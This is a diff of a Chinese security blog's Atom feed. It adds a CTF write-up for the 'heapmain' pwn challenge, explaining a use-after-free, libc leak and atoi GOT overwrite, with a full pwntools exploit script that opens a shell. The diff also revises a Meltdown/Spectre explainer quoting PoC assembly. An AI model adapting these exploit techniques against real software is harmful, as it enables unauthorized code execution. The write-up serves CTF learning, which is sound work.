@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://weaponx.site/"/>
-  <updated>2018-05-23T05:50:05.417Z</updated>
+  <updated>2018-06-07T02:41:19.477Z</updated>
   <id>http://weaponx.site/</id>
   
   <author>
@@ -14,6 +14,62 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>铁人三项 2018 pwn [heapmain] Writeup</title>
+    <link href="http://weaponx.site/2018/06/06/%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9-2018-pwn-heapmain-Writeup/"/>
+    <id>http://weaponx.site/2018/06/06/铁人三项-2018-pwn-heapmain-Writeup/</id>
+    <published>2018-06-07T02:40:37.000Z</published>
+    <updated>2018-06-07T02:41:19.477Z</updated>
+    
+    <content type="html"><![CDATA[<p>这个题目的原题是RHME3，直接拿来二进制修改，去掉网络函数，使用socat部署。这波操作可还行</p>
+<a id="more"></a>
+<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">.text:00000000004021A1 ; int __cdecl main(int argc, const char **argv, const char **envp)</div><div class="line">.text:00000000004021A1                 public main</div><div class="line">.text:00000000004021A1 main            proc near               ; DATA XREF: _start+1D↑o</div><div class="line">.text:00000000004021A1</div><div class="line">.text:00000000004021A1 var_9           = byte ptr -9</div><div class="line">.text:00000000004021A1 var_4           = dword ptr -4</div><div class="line">.text:00000000004021A1</div><div class="line">.text:00000000004021A1 ; __unwind &#123;</div><div class="line">.text:00000000004021A1                 push    rbp</div><div class="line">.text:00000000004021A2                 mov     rbp, rsp</div><div class="line">.text:00000000004021A5                 sub     rsp, 10h</div><div class="line">.text:00000000004021A9                 mov     [rbp+var_9], 0</div><div class="line">.text:00000000004021AD                 nop</div><div class="line">.text:00000000004021AE                 nop</div><div class="line">.text:00000000004021AF                 nop</div><div class="line">.text:00000000004021B0                 nop</div><div class="line">.text:00000000004021B1                 nop</div><div class="line">...</div><div class="line">.text:00000000004021C7                 nop</div><div class="line">.text:00000000004021C8                 nop</div><div class="line">.text:00000000004021C9                 nop</div><div class="line">.text:00000000004021CA                 nop</div><div class="line">.text:00000000004021CB                 nop</div><div class="line">.text:00000000004021CC                 nop</div><div class="line">.text:00000000004021CD                 nop</div><div class="line">.text:00000000004021CE                 mov     rax, cs:stdout@@GLIBC_2_2_5</div><div class="line">.text:00000000004021D5                 mov     esi, 0          ; buf</div><div class="line">.text:00000000004021DA                 mov     rdi, rax        ; stream</div><div class="line">.text:00000000004021DD                 call    _setbuf</div><div class="line">.text:00000000004021E2                 mov     edi, offset aWelcomeToYourT ; &quot;Welcome to your TeamManager (TM)!&quot;</div><div class="line">.text:00000000004021E7                 call    _puts</div></pre></td></tr></table></figure>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>废话不多说，题目漏洞比较明显，在于使用函数<code>delete_player</code>后没有置空<code>selected</code>导致UAF。那么，我们能用这个UAF干什么呢？</p>
+<p>程序中player的数据结构是这样的</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">struct</span> player&#123;</div><div class="line">    int32 attack;</div><div class="line">    int32 defense;</div><div class="line">    int32 speed;</div><div class="line">    int32 precision;</div><div class="line">    <span class="keyword">char</span>* name;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>这块就有个关键点<code>edit_player</code>中的<code>set_name</code>函数，用来修改<code>name</code>字段的时候用到了<code>realloc</code>函数。这个函数比较特殊，可以在制定地址上重新分配一个堆，即可以对给定的指针所指的空间进行扩大或者缩小 。当然，扩大的时候会破坏其他内存则类似malloc重新分配一个指针指向的内存空间。</p>
+<h3 id="泄露堆地址（貌似没啥用）"><a href="#泄露堆地址（貌似没啥用）" class="headerlink" title="泄露堆地址（貌似没啥用）"></a>泄露堆地址（貌似没啥用）</h3><p>首先，我们可以通过以下方法泄露堆的地址：</p>
+<p>1.分配一个player 1，name的长度为23，则name会分配24字节。</p>
+<p>2.选中这个player 1</p>
+<p>3.释放这个player 1</p>
+<p>4.显示这个player 1，这时候1-&gt;name中的fd指向player 1的地址。打印name的时候就会把player的地址打印出来。</p>
+<h3 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h3><p>接着，我们可以通过以下方法泄露libc的地址：</p>
+<p>1.分配一个player 1，name的长度为23，则name会分配24字节。</p>
+<p>2.选中这个player 1</p>
+<p>3.释放这个player 1</p>
+<p>4.分配一个player 2，这块内存其实是1-&gt;name。2-&gt;name长度为23，这块内存为1-&gt;player。</p>
+<p>5.编辑player 1，1-&gt;name长度扩展为0x90。</p>
+<p>6.再创建一个player 3（作用是隔开0x90的内存和top chunk，方式free后合并到top chunk）</p>
+<p>7.然后释放palyer 2，也就是把1-&gt;name的内存释放，此时这块内存被放入unsorted bin里，link到main_arena上</p>
+<p>8.show player1 会泄露出libc上的main_arena的地址，就可以计算出libc的基址，由于给了libc就可以求出system的地址</p>
+<h3 id="GOT劫持"><a href="#GOT劫持" class="headerlink" title="GOT劫持"></a>GOT劫持</h3><p>接下来是控制执行流程（realloc分配内存到got上，覆盖aoit的got为system）：</p>
+<p>1.分配player 1，name长度80</p>
+<p>2.分配player 2，name长度80</p>
+<p>3.选中1</p>
+<p>4.释放player 1，释放player 2</p>
+<p>5.分配一个player 3，name的长度为23，内容为<code>&#39;a&#39;*16 + atoi_got</code>。此时player3 的内存为player2，player3-&gt;name为player1。</p>
+<p>6.修改player-&gt;name为system，此时会将atoi_got分配给我们，然后system的地址会填入atoi。</p>
+<p>7.最后输入sh即可</p>
+<h2 id="EXPLOIT"><a href="#EXPLOIT" class="headerlink" title="EXPLOIT"></a>EXPLOIT</h2><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">r = process(<span class="string">'./heapmain'</span>, env= &#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc.so.6'</span>&#125;)</div><div class="line">elf = ELF(<span class="string">'./heapmain'</span>)</div><div class="line"><span class="comment">#libc = ELF('./libc-2.23.so')</span></div><div class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</div><div class="line"><span class="comment">#context.log_level = 'DEBUG'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name, attack, defense, speed, precision)</span>:</span></div><div class="line">    r.recvuntil(<span class="string">'Your choice: '</span>)</div><div class="line">    r.sendline(<span class="string">'1'</span>)</div><div class="line">    r.recvuntil(<span class="string">'name: '</span>)</div><div class="line">    r.sendline(name)</div><div class="line">    r.recvuntil(<span class="string">'attack points: '</span>)</div><div class="line">    r.sendline(str(attack))</div><div class="line">    r.recvuntil(<span class="string">'defense points: '</span>)</div><div class="line">    r.sendline(str(defense))</div><div class="line">    r.recvuntil(<span class="string">'speed: '</span>)</div><div class="line">    r.sendline(str(speed))</div><div class="line">    r.recvuntil(<span class="string">'precision: '</span>)</div><div class="line">    r.sendline(str(precision))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></div><div class="line">    r.recvuntil(<span class="string">'Your choice: '</span>)</div><div class="line">    r.sendline(<span class="string">'2'</span>)</div><div class="line">    r.recvuntil(<span class="string">'Enter index: '</span>)</div><div class="line">    r.sendline(str(idx))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">select</span><span class="params">(idx)</span>:</span></div><div class="line">    r.recvuntil(<span class="string">'Your choice: '</span>)</div><div class="line">    r.sendline(<span class="string">'3'</span>)</div><div class="line">    r.recvuntil(<span class="string">'Enter index: '</span>)</div><div class="line">    r.sendline(str(idx))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(name = <span class="string">''</span>, attack = <span class="string">''</span>, defense = <span class="string">''</span>, speed = <span class="string">''</span>, precision = <span class="string">''</span>)</span>:</span></div><div class="line">    r.recvuntil(<span class="string">'Your choice: '</span>)</div><div class="line">    r.sendline(<span class="string">'4'</span>)</div><div class="line">    <span class="keyword">if</span> name:</div><div class="line">        r.recvuntil(<span class="string">'Your choice: '</span>)</div><div class="line">        r.sendline(<span class="string">'1'</span>)</div><div class="line">        r.recvuntil(<span class="string">'Enter new name: '</span>)</div><div class="line">        r.sendline(name)</div><div class="line">    <span class="keyword">if</span> str(attack):</div><div class="line">        r.recvuntil(<span class="string">'Your choice: '</span>)</div><div class="line">        r.sendline(<span class="string">'2'</span>)</div><div class="line">        r.recvuntil(<span class="string">'attack points: '</span>)</div><div class="line">        r.sendline(str(attack))</div><div class="line">    <span class="keyword">if</span> str(defense):</div><div class="line">        r.recvuntil(<span class="string">'Your choice: '</span>)</div><div class="line">        r.sendline(<span class="string">'3'</span>)</div><div class="line">        r.recvuntil(<span class="string">'defense points: '</span>)</div><div class="line">        r.sendline(str(defense))</div><div class="line">    <span class="keyword">if</span> str(speed):</div><div class="line">        r.recvuntil(<span class="string">'Your choice: '</span>)</div><div class="line">        r.sendline(<span class="string">'4'</span>)</div><div class="line">        r.recvuntil(<span class="string">'speed: '</span>)</div><div class="line">        r.sendline(str(speed))</div><div class="line">    <span class="keyword">if</span> str(precision):</div><div class="line">        r.recvuntil(<span class="string">'Your choice: '</span>)</div><div class="line">        r.sendline(<span class="string">'5'</span>)</div><div class="line">        r.recvuntil(<span class="string">'precision: '</span>)</div><div class="line">        r.sendline(str(precision))</div><div class="line"></div><div class="line">    r.recvuntil(<span class="string">'Your choice: '</span>)</div><div class="line">    r.sendline(<span class="string">'0'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_player</span><span class="params">()</span>:</span></div><div class="line">    r.recvuntil(<span class="string">'Your choice: '</span>)</div><div class="line">    r.sendline(<span class="string">'5'</span>)</div><div class="line">    r.recvuntil(<span class="string">'\tName: '</span>)</div><div class="line">    name = r.recvline()</div><div class="line">    r.recvuntil(<span class="string">'\tA/D/S/P: '</span>)</div><div class="line">    ret = r.recvline()</div><div class="line">    ret = ret.split(<span class="string">','</span>)</div><div class="line">    <span class="keyword">return</span> name, ret[<span class="number">0</span>], ret[<span class="number">1</span>], ret[<span class="number">2</span>], ret[<span class="number">3</span>]</div><div class="line"></div><div class="line"></div><div class="line">add(<span class="string">'a'</span>*<span class="number">23</span>, <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>)</div><div class="line">select(<span class="number">0</span>)</div><div class="line">delete(<span class="number">0</span>)</div><div class="line">_,attack,_,_,_ = show_player()</div><div class="line">heap_base = int(attack) - <span class="number">0x20</span></div><div class="line"></div><div class="line">add(<span class="string">'b'</span>*<span class="number">23</span>, <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>)</div><div class="line"></div><div class="line">edit(<span class="string">'c'</span>*<span class="number">0x90</span>, <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>)</div><div class="line"></div><div class="line">add(<span class="string">'d'</span>*<span class="number">23</span>, <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>)</div><div class="line"></div><div class="line">delete(<span class="number">0</span>)</div><div class="line">name,_,_,_,_ =  show_player()</div><div class="line"></div><div class="line">unsortedbin_addr = u64(name[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div><div class="line">libc_base = unsortedbin_addr - <span class="number">0x3c4b78</span></div><div class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</div><div class="line"></div><div class="line">log.success(<span class="string">'HEAP BASE =&gt; %s'</span> % hex(heap_base))</div><div class="line">log.success(<span class="string">'UNSORTEDBIN ADDR =&gt; %s'</span> % hex(unsortedbin_addr))</div><div class="line">delete(<span class="number">1</span>)</div><div class="line"></div><div class="line">add(<span class="string">'a'</span>*<span class="number">80</span>, <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>)</div><div class="line">add(<span class="string">'b'</span>*<span class="number">80</span>, <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>)</div><div class="line">select(<span class="number">0</span>)</div><div class="line"></div><div class="line">delete(<span class="number">0</span>)</div><div class="line">delete(<span class="number">1</span>)</div><div class="line"></div><div class="line">payload = <span class="string">'a'</span> * <span class="number">16</span> + p64(elf.got[<span class="string">'atoi'</span>])</div><div class="line">add(payload, <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>)</div><div class="line"></div><div class="line">edit(name=p64(system_addr))</div><div class="line"></div><div class="line">r.recv(<span class="number">512</span>)</div><div class="line">r.sendline(<span class="string">'sh'</span>)</div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;这个题目的原题是RHME3，直接拿来二进制修改，去掉网络函数，使用socat部署。这波操作可还行&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="安全" scheme="http://weaponx.site/categories/%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="pwn" scheme="http://weaponx.site/tags/pwn/"/>
+    
+      <category term="ctf" scheme="http://weaponx.site/tags/ctf/"/>
+    
+      <category term="writeup" scheme="http://weaponx.site/tags/writeup/"/>
+    
+  </entry>
   
   <entry>
     <title>DDCTF REVERSE baby_mips</title>
@@ -224,7 +280,7 @@
     <link href="http://weaponx.site/2018/01/09/%E4%BB%8ECPU%E6%BC%8F%E6%B4%9EMeltdown-Spectre%EF%BC%88CVE-2017-5754-CVE-2017-5715-CVE-2017-5753%EF%BC%89%E7%9C%8B%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/"/>
     <id>http://weaponx.site/2018/01/09/从CPU漏洞Meltdown-Spectre（CVE-2017-5754-CVE-2017-5715-CVE-2017-5753）看侧信道攻击/</id>
     <published>2018-01-09T14:16:55.000Z</published>
-    <updated>2018-01-11T08:01:17.121Z</updated>
+    <updated>2018-06-07T02:39:05.303Z</updated>
     
     <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>2018伊始，两个芯片级漏洞<code>Meltdown</code>（熔断）、<code>Spectre</code>（幽灵）漏洞震惊的安全界。受影响的CPU包括<code>Intel</code>、<code>AMD</code>和<code>ARM</code>，基本囊括的消费级CPU市场的绝大部分。<code>Meltdown</code>漏洞可以在用户态越权读取内核态的内存数据，<code>Spectre</code>漏洞可以通过浏览器的<code>Javascript</code>读取用户态的内存数据。虽然这两个漏洞对个人PC影响有限，但是确摧毁了公有云的基石——用户可在虚拟机里可以无限制的读取宿主机或者其他虚拟机的数据。</p>
 <h2 id="0x01-背景知识"><a href="#0x01-背景知识" class="headerlink" title="0x01 背景知识"></a>0x01 背景知识</h2><p>了解<code>Meltdown</code>和<code>Spectre</code>漏洞之前，首先要知道几个背景知识。现代CPU为了提高运算效率与运算速度，会采用以下的手段提高CPU运算速度：分支预测（<code>branch prediction</code>）、推测执行（<code>speculation execution</code>）和乱序执行（<code>out-of-order execution</code>）。</p>
@@ -241,21 +297,20 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">; rcx = kernel space address</div><div class="line">; rbx = user space address</div><div class="line">mov al, byte[rcx]</div><div class="line">shl al, 0xc</div><div class="line">mov rbx, qword[rbx + rax]</div></pre></td></tr></table></figure>
 <p>这段代码看上去并没有什么问题。因为在用户态的时候，在执行第一行代码时就会因为鉴权失败而停止执行后面的代码。</p>
 <p>然而，当现代CPU执行这一段代码时，由于之前提到的特性，CPU为了加快运算速度，在执行完第一行代码后，在耗时的鉴权时，会执行第二行、第三行代码。当鉴权失败后，CPU会将状态回滚，当作后面的代码没有执行，此时用户态程序还是没法获取到内核态的数据。</p>
-<p>但是，问题来了。CPU状态回滚后，缓存Cache并不会回滚，我们还是可以通过侧信道攻击（<code>Side Channel  Attack</code>）来猜测内核态的数据。此时，我们还要知道两点：第一，当CPU访问一个地址时，若没有在缓存中则会将这个地址所在的内存页（4KB = 4096B）放入缓存中；第二，访问缓存数据的速度远大于访问内存。</p>
-<p>这段代码在第一行取了<code>kernel address</code>存放的第一字节的数据，第二行将这个数据左移<code>0xc</code>位，相当于乘以<code>4096</code>，也就是<code>4K</code>。此时，这个数据就相当于一个内存页的<code>index</code>序号。第三行代码访问了这个地址，此时CPU会将这个内存页放入缓存中。接下来，我们遍历一下<code>index</code>从0到255号内存页，访问特别短的那个内存页的序号就是我们要猜测的数据。</p>
+<p>但是，问题来了。CPU状态回滚后，缓存Cache并不会回滚，我们还是可以通过侧信道攻击（<code>Side Channel  Attack</code>）来猜测内核态的数据。此时，我们还要知道两点：第一，当CPU访问一个地址时，若没有在缓存中则会将这个数据放入缓存Cache Line中；第二，访问缓存数据的速度远大于访问内存。</p>
+<p>这段代码在第一行取了<code>kernel address</code>存放的第一字节的数据，第二行将这个数据左移<code>0xc</code>位，相当于乘以<code>4096</code>，也就是<code>4K</code>。此时，这个数据就相当于一个内存页的<code>index</code>序号，为什么要用4096呢？为了避免内存预读带来的影响，因为CPU在每次从主存访问内存的时，根据局部性原理，有可能将邻将的内存也读进来。Intel的开发手册上指明CPU的内存预取不会跨页面，而每个页面的大小是4096。第三行代码访问了这个地址，此时CPU会将这个内存页放入缓存中。接下来，我们遍历一下<code>index</code>从0到255号内存页，访问特别短的那个内存页的序号就是我们要猜测的数据。</p>
 <p>下面，我们通过图解来展示一下这个漏洞的原理。</p>
 <p>第一步，将<code>kernel space address</code>的第一字节放入<code>rax</code>的低<code>8</code>位，假设为<code>0x20</code>。</p>
 <p><img src="1.png" alt=""></p>
 <p>第二步，将<code>rax</code>的低8位左移<code>0xc</code>位，也就是<code>0x20 * 4096</code>。</p>
-<p>第三步，访问<code>rbx + rax</code>也就是<code>rbx + 0x20 * 4096</code>，此时会将这个地址所在的内存页放入缓存中。</p>
+<p>第三步，访问<code>rbx + rax</code>也就是<code>rbx + 0x20 * 4096</code>，此时会将这个地址的数据缓存如Cache中。</p>
 <p>第四部，遍历<code>rbx + index * 4096</code>，若缓存命中，则说明此时的<code>index</code>就是<code>rcx</code>指向的内核态的第一字节数据。</p>
 <p><img src="2.png" alt=""></p>
-<p>此时，访问<code>rbx + 0x20 * 4096</code>命中缓存，所以<code>rcx</code> 指向内核态的第一字节数据为<code>0x20</code> 。</p>
+<p>此时，访问<code>rbx + 0x20 * 4096</code>数据命中缓存，所以<code>rcx</code> 指向内核态的第一字节数据为<code>0x20</code> 。</p>
 <p>接下来，我们看看<code>Github</code>上放出的<code>PoC</code>代码<code>https://github.com/paboldin/meltdown-exploit/</code> 。因为这个代码同时支持<code>x86_64</code>和<code>i386</code>，所以核心汇编代码有两段。</p>
 <ul>
 <li><p>x86_64</p>
 <figure class="highlight"><table><tr><td class="code"><pre><div class="line">asm volatile (</div><div class="line">    "1:\n\t"</div><div class="line">    ".rept 300\n\t"</div><div class="line">    "add $0x141, %%rax\n\t"</div><div class="line">    ".endr\n\t"</div><div class="line">    "movzx (%[addr]), %%eax\n\t"</div><div class="line">    "shl $12, %%rax\n\t"</div><div class="line">    "jz 1b\n\t"</div><div class="line">    "movzx (%[target], %%rax, 1), %%rbx\n"</div><div class="line">    "stopspeculate: \n\t"</div><div class="line">    "nop\n\t"</div><div class="line">    :</div><div class="line">    : [target] "r" (target_array),</div><div class="line">      [addr] "r" (addr)</div><div class="line">    : "rax", "rbx"</div><div class="line">);</div></pre></td></tr></table></figure>
-<p>​</p>
 </li>
 <li><p>i386</p>
 <figure class="highlight"><table><tr><td class="code"><pre><div class="line">asm volatile (</div><div class="line">  "1:\n\t"</div><div class="line">  ".rept 300\n\t"</div><div class="line">  "add $0x141, %%eax\n\t"</div><div class="line">  ".endr\n\t"</div><div class="line">  "movzx (%[addr]), %%eax\n\t"</div><div class="line">  "shl $12, %%eax\n\t"</div><div class="line">  "jz 1b\n\t"</div><div class="line">  "movzx (%[target], %%eax, 1), %%ebx\n"</div><div class="line">  "stopspeculate: \n\t"</div><div class="line">  "nop\n\t"</div><div class="line">  :</div><div class="line">  : [target] "r" (target_array),</div><div class="line">    [addr] "r" (addr)</div><div class="line">  : "rax", "rbx"</div><div class="line">);</div></pre></td></tr></table></figure>
@@ -278,7 +333,7 @@
 <p>其实<code>Spectre</code>存在两个漏洞，也就是两个CVE-2017-5753和CVE-2017-5715。其中CVE-2017-5715是分支预测注入漏洞<code>BranchTarget Injection</code>目前没发现公开的<code>PoC</code>，CVE-2017-5753是边界检查绕过漏洞<code>BoundsCheck Bypass</code>有公开的<code>PoC</code>，下面分析这段<code>PoC</code> 。</p>
 <p>首先，我们来看一段代码</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> array1_size = <span class="number">16</span>;</div><div class="line"><span class="keyword">uint8_t</span> array1[<span class="number">160</span>]  = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span> &#125;;</div><div class="line"><span class="keyword">uint8_t</span> array2[<span class="number">256</span> * <span class="number">512</span>];</div><div class="line"><span class="keyword">uint8_t</span> temp = <span class="number">0</span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">victim_function</span><span class="params">(<span class="keyword">size_t</span> x)</span> </span>&#123;  </div><div class="line">    <span class="keyword">if</span> (x &lt; array1_size) &#123;  </div><div class="line">        temp &amp;= array2[array1[x] * <span class="number">512</span>];  </div><div class="line">    &#125;  </div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>很明显，代码有边界检查，我们无法越界读取别的地址的数据。但是，在CPU执行判断时，CPU会通过预测执行来执行<code>temp &amp;= array2[array1[x] * 512]</code>。 最后，因为判断不成立，所以状态回滚。根据<code>Meltdown</code>中的知识，我们可以知道，访问<code>array1[x]</code>和<code>array2[array1[x] * 512]</code>后，会将这两个数据缓存下来，而且回滚后缓存不清除。此时<code>array2[array1[x] * 512]</code>所在的物理页会被缓存，我们只需要遍历<code>0 - 255</code>即可猜到<code>array1[x]</code>的值。</p>
+<p>很明显，代码有边界检查，我们无法越界读取别的地址的数据。但是，在CPU执行判断时，CPU会通过预测执行来执行<code>temp &amp;= array2[array1[x] * 512]</code>。 最后，因为判断不成立，所以状态回滚。根据<code>Meltdown</code>中的知识，我们可以知道，访问<code>array1[x]</code>和<code>array2[array1[x] * 512]</code>后，会将这两个数据缓存下来，而且回滚后缓存不清除。此时<code>array2[array1[x] * 512]</code>的数据会被缓存，我们只需要遍历<code>0 - 255</code>即可猜到<code>array1[x]</code>的值。</p>
 <h2 id="0x04-侧信道攻击"><a href="#0x04-侧信道攻击" class="headerlink" title="0x04 侧信道攻击"></a>0x04 侧信道攻击</h2><p>之前tombkeeper教主曾在QCon2017的演讲《代码未写，漏洞已出——架构和设计的安全》中讲过一个例子，在Java 6.0时代，在信息摘要类中有一个函数<code>isEqual</code>用来验证<code>HMAC</code>等数据，它的实现如下：</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isEqual</span><span class="params">(<span class="keyword">byte</span> digesta[], <span class="keyword">byte</span> digestb[])</span></span>&#123;</div><div class="line">    <span class="keyword">if</span> (digesta.length != digestb.length)</div><div class="line">      <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    <span class="keyword">for</span> ( <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; digesta.length; i++)&#123;</div><div class="line">        <span class="keyword">if</span> (digesta[i] != digestb[i])&#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p>这个函数看来貌似没有什么问题，但是我们假设<code>digestb</code>是我们已有的密钥，<code>digesta</code>是用户传入的密钥。程序匹配到两个密钥相同位不等的时候会退出。但是只要我们一位一位去猜，就可以利用微小的时间差将猜测速度提升无数倍。</p>
@@ -1047,32 +1102,6 @@
       <category term="安全" scheme="http://weaponx.site/tags/%E5%AE%89%E5%85%A8/"/>
     
       <category term="漏洞分析" scheme="http://weaponx.site/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>评论系统切换至网易云跟帖</title>
-    <link href="http://weaponx.site/2017/04/13/%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F%E5%88%87%E6%8D%A2%E8%87%B3%E7%BD%91%E6%98%93%E4%BA%91%E8%B7%9F%E5%B8%96/"/>
-    <id>http://weaponx.site/2017/04/13/评论系统切换至网易云跟帖/</id>
-    <published>2017-04-13T06:25:28.000Z</published>
-    <updated>2017-04-13T06:28:36.157Z</updated>
-    
-    <content type="html"><![CDATA[<p>用了一阵多说，disqus。多说的问题在于经常大姨妈，而且即将关站。disqus被墙，对国内用户访问不友好。</p>
-<p>对比了下友言和网易云跟帖，友言还需要备案号。当然最后选择的网易云跟帖。</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;用了一阵多说，disqus。多说的问题在于经常大姨妈，而且即将关站。disqus被墙，对国内用户访问不友好。&lt;/p&gt;
-&lt;p&gt;对比了下友言和网易云跟帖，友言还需要备案号。当然最后选择的网易云跟帖。&lt;/p&gt;
-
-    
-    </summary>
-    
-      <category term="生活" scheme="http://weaponx.site/categories/life/"/>
-    
-    
-      <category term="博客" scheme="http://weaponx.site/tags/%E5%8D%9A%E5%AE%A2/"/>
     
   </entry>
   
